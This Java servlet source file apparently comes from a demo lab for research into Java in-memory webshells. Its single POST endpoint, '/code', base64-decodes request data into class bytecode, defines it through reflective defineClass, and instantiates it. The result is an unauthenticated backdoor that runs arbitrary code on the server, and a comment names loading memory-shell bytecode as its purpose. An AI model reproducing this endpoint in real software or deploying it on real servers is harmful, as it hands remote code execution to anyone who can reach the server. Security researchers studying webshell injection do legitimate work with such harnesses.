package com.example.demo.Servlet;

import com.example.demo.Static.AddFilter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.util.Base64;


@WebServlet("/code")
public class CodeExecutionServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        // 获取 base64 编码的字节码
        // 服务器端 Java
        // 服务器端 Java
        String base64Code = URLDecoder.decode(request.getParameter("code"), "UTF-8");
        // 如果有字符被替换，尝试替换空格为 `+`
        base64Code = base64Code.replace(" ", "+");
        System.out.println(base64Code);
        if (base64Code != null) {
            try {
                // 解码 base64
                byte[] classBytes = Base64.getDecoder().decode(base64Code);

                // 获取当前线程的类加载器
                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

                // 反射调用defineClass
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                Class<?> loadedClass = (Class<?>) defineClassMethod.invoke(classLoader, null, classBytes, 0, classBytes.length);

                // 实例化并调用静态代码块
                loadedClass.getDeclaredConstructor().newInstance();

                // 可以选择尝试加载类的一些属性或方法进行进一步验证
                response.getWriter().write("Class loaded and static block executed successfully.");
            } catch (Exception e) {
                e.printStackTrace();
                response.getWriter().write("Error executing code: " + e.getMessage());
            }
        } else {
            response.getWriter().write("No code provided");
        }
    }
    // 自定义ClassLoader，用于从字节数组加载类

    /**
     * 尽量避免使用自定义的类加载器来加载内存马的字节码，因为自定义类加载器可能导致与 Servlet 容器的类加载器不兼容，从而导致问题。你可以直接使用标准的类加载方式
     */
    public class CustomClassLoader extends ClassLoader {
        public Class<?> loadClassFromBytes(byte[] classBytes) {
            return defineClass(null, classBytes, 0, classBytes.length);
        }
    }

}
